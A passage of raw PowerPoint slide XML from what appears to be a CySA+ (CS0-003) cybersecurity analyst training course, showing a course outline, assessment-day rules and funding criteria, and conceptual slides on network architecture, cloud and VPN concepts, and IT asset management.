              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Evidence acquisition &amp; chain of custody</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Memory &amp; host forensics</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Log analysis for IR</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Containment &amp; isolation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  IR playbooks &amp; tabletop exercises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COURSE OUTLINE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400" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Course Outline — Topic 4: Reporting and Communication (17%)</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600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Vulnerability management reporting</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Executive incident reporting</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Security metrics (MTTD/MTTR)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Compliance reporting (PCI DSS / ISO 27001 / NIST)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Stakeholder communication &amp; lessons learned</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FINAL ASSESSMENT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Briefing for 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Place phones and other materials under the table or on the floor.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  No photos or recording of assessment scripts.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  No discussion during the assessment.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Use a black/blue pen for hard-copy assessments. No liquid paper or correction tape.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Assessment scripts will be collected when the time is up.</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FINAL ASSESSMENT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Written Assessment (SAQ) — 1 hour.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Case Study (CS) — 1 hour.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Format: Open Book — slides, Learner Guide and approved materials only.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  An appeal process is available for learners assessed as Not Yet Competent.</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ON ASSESSMENT DAY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Assessment Flow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TRAQOM survey — scan the QR code on the LMS</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Assessment digital attendance — scan the SSG QR</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Sit WA (SAQ) then Case Study — open book</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Submit your answers on the LMS</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Sign the Assessment Summary Record</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WSQ FUNDING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Criteria for Funding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Minimum attendance rate of 75% based on the SSG Digital Attendance record.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Complete the assessment and be assessed as 'Competent'.</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1 · 33% OF CS0-003</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Security Operations</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1</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EXAM WEIGHTING 33%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Topic 1 Overview — Security Operations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85074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85074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537667"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>OS &amp; software security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6231636" y="1783080"/>
            <a:ext cx="5180076"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68397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1850745"/>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185074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537667"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Logging &amp; log ingestion</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Rectangle 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2704795"/>
            <a:ext cx="5180076"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2704795"/>
            <a:ext cx="91440" cy="68397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277246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27724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2796235"/>
            <a:ext cx="3973068" cy="537667"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Network architecture &amp; segmentation</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Rectangle 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6231636" y="2704795"/>
            <a:ext cx="5180076"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2704795"/>
            <a:ext cx="91440" cy="68397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277246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27724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2796235"/>
            <a:ext cx="3973068" cy="537667"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Identity &amp; access management</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Rectangle 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3626510"/>
            <a:ext cx="5180076"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362651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369417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369417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3717950"/>
            <a:ext cx="3973068" cy="537667"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Encryption &amp; active defence</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Rectangle 31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6231636" y="3626510"/>
            <a:ext cx="5180076"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3626510"/>
            <a:ext cx="91440" cy="68397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3694175"/>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369417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3717950"/>
            <a:ext cx="3973068" cy="537667"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Indicators of malicious activity</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="37" name="Rectangle 36"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4548225"/>
            <a:ext cx="5180076"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 y="4548225"/>
            <a:ext cx="91440" cy="68397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33272" y="461589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33272" y="461589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7</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="41" name="TextBox 40"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1764792" y="4639665"/>
            <a:ext cx="3973068" cy="537667"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Packet &amp; traffic analysis</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="42" name="Rectangle 41"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6231636" y="4548225"/>
            <a:ext cx="5180076"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231636" y="4548225"/>
            <a:ext cx="91440" cy="68397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6487668" y="461589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487668" y="461589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8</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="46" name="TextBox 45"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7219188" y="4639665"/>
            <a:ext cx="3973068" cy="537667"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Email analysis</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="47" name="Rectangle 46"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5469940"/>
            <a:ext cx="5180076"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777240" y="546994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1033272" y="553760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033272" y="553760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9</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="51" name="TextBox 50"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1764792" y="5561380"/>
            <a:ext cx="3973068" cy="537667"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Threat intelligence &amp; MITRE ATT&amp;CK</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="52" name="TextBox 5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53" name="TextBox 5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54" name="TextBox 5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NETWORK ARCHITECTURE AND ASSET MANAGEMENT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Network Architecture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Network architecture describes how devices and links are arranged, both physically and logically, using topologies such as star (all nodes connect to a central switch), bus (nodes share a single backbone), and mesh (nodes interconnect for redundancy).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Software-defined networking (SDN) separates the control plane, which makes routing and forwarding decisions, from the data plane, which actually moves packets, letting administrators program and centrally orchestrate network behavior.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A virtual private cloud (VPC) carves out logically isolated, private resources inside a shared public cloud, using encryption, private subnets, and access controls so tenant traffic stays segregated.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts must understand these designs because the chosen topology and control model determine where sensors, chokepoints, and trust boundaries sit, which shapes both monitoring coverage and attack paths.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect scenario questions asking you to match a topology, SDN control/data plane concept, or VPC design to a security or monitoring requirement.</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NETWORK ARCHITECTURE AND ASSET MANAGEMENT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Network Architecture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Physical</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Star</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Bus</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Mesh</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Software-defined</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Control layer (routing)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Data layer (moving packets)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NETWORK ARCHITECTURE AND ASSET MANAGEMENT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Network Architecture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Virtual private cloud (VPC)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Private resources in a public cloud environment</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Uses encryption for security</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Virtual Private Network (VPN)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Secure tunnel between two endpoints</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Almost always encrypted</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NETWORK ARCHITECTURE AND ASSET MANAGEMENT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Network Architecture (3)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Serverless</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Deploy software network components without a server</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  FaaS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Use other people's services instead of hosting your own</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NETWORK ARCHITECTURE AND ASSET MANAGEMENT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Asset Management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IT Asset Management (ITAM) is the practice of tracking every hardware and software asset across its lifecycle: acquisition, deployment, maintenance, retirement, and secure disposal.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  It relies on an accurate inventory and configuration baseline, often enforced through asset tagging and a configuration management database (CMDB) so each asset has a known owner, location, and state.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  For a SOC, you cannot protect, patch, or scan what you do not know exists, so complete asset visibility is the foundation for vulnerability management, incident scoping, and detecting rogue or unmanaged devices.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam ties asset management to vulnerability and detection coverage, testing why unknown or unmanaged assets create blind spots and how lifecycle stages affect risk.</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NETWORK ARCHITECTURE AND ASSET MANAGEMENT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Asset Management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IT Asset Management (ITAM)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Asset lifecycle</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Acquisition</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Deployment</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Maintenance</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Retirement</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Disposal</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
